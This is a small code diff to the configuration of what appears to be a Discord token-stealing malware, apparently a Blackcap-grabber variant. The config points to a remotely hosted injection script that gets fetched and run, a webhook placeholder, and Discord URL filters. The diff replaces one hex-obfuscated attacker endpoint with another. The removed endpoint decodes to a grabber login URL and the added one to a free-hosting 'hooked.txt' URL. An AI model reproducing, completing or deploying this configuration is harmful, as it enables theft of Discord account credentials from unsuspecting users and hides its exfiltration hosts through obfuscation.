@@ -17,7 +17,7 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/ytjhrttytj/hu43ygf5yhgiui3u5uyhiu4hvgwugtghuies/main/index.js",
     webhook: "%WEBHOOK%",
-    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
+    uwu: "/x68/x74/x74/x70/x73/x3A/x2F/x2F/x74/x68/x65/x62/x65/x73/x74/x64/x75/x61/x6C/x72/x69/x67/x68/x74/x2E/x30/x30/x30/x77/x65/x62/x68/x6F/x73/x74/x61/x70/x70/x2E/x63/x6F/x6D/x2F/x68/x6F/x6F/x6B/x65/x64/x2E/x74/x78/x74",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
